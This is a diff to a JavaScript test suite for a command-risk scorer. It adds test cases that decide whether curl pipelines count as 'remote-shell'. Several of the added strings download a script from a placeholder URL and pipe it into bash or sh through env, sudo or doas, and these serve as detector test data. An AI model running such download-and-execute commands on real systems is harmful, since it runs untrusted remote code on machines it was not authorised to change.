@@ -43,6 +43,9 @@ describe("a command that downloads a script and runs it is a remote shell howeve
     `curl -s ${URL} | sudo -u root bash`,
     `curl -s ${URL} | doas -u root /bin/sh`,
     `curl -s "${URL}?a=1&b=2" | sh`,
+    // an escaped quote is part of the header value, not the start of a quoted argument
+    `curl -H X-Label:\\"value ${URL} | sh`,
+    `curl -s ${URL} | env FOO=1 bash`,
   ]) {
     test(cmd, () => {
       const r = scoreOf(cmd);
@@ -63,6 +66,9 @@ describe("commands that do not run what they download are not", () => {
     `curl "https://example.invalid/search?q=foo|sh"`,
     `curl -s 'https://example.invalid/a|bash' -o out.txt`,
     `curl -s "${URL}" | sudo tee /etc/app/x.sh`,
+    // a wrapper's command, not one of its options: grep searches the download for "bash"
+    `curl -s ${URL} | env grep bash`,
+    `curl -s ${URL} | sudo -u root grep bash`,
   ]) {
     test(cmd, () => {
       expect(scoreOf(cmd).ids).not.toContain("remote-shell");
